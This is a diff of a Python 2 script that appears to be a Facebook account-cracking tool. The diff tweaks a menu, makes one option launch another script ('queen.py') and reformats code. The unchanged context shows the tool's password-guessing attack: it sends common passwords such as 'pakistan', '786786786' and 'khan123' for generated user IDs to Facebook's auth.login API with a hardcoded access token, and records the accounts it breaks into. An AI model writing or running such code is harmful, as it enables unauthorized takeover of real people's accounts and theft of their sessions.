@@ -232,10 +232,10 @@ def pilih_login():
 		os.system("xdg-open https://m.facebook.com/jam.shahrukh.official")
 	        login()
         elif peak =="3":
-	        os.system('xdg-open https://www.youtube.com/channel/UCtiBO4aL6y-W80hjeGZyd7g?sub_confirmation=1')
+	        os.system('xdg-open https://m.youtube.com/channel/UCtiBO4aL6y-W80hjeGZyd7g?sub_confirmation=1')
 	        login()
 	elif peak =="0":
-		keluar()
+		os.system('python2 queen.py')
         else:
 		print"\033[1;91m[!] Wrong input"
 		keluar()
@@ -311,7 +311,7 @@ def action():
 					cps.close()
 					cpb.append(c+user+pass1)
  				else:
- 				    pass2="pakistan"
+ 				    pass2 = "pakistan"
  				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				    q = json.load(data)
  				    if 'access_token' in q:
@@ -328,7 +328,7 @@ def action():
  					        cps.close()
  					        cpb.append(c+user+pass2)
                                         else:
- 				            pass3="786786786"
+ 				            pass3 = "786786786"
  				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				            q = json.load(data)
  				            if 'access_token' in q:
@@ -345,7 +345,7 @@ def action():
  					                cps.close()
  					                cpb.append(c+user+pass3)
                                                 else:
- 				                    pass4="khan123"
+ 				                    pass4 = "khan123"
  				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				                    q = json.load(data)
  				                    if 'access_token' in q:
